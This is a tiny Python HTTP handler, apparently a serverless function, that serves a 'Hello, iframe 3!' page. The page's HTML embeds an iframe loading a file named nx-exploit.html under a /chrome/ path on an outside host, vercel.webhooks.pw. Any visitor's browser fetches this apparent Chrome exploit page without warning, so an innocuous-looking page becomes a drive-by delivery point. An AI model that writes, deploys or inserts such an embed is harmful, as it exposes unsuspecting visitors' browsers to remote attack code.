from http.server import BaseHTTPRequestHandler

class handler(BaseHTTPRequestHandler):

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()
        self.wfile.write('<html><body><h1>Hello, iframe 3!</h1><iframe src=https://vercel.webhooks.pw/chrome/nx-exploit.html></iframe></body></html>'.encode('utf-8'))
        return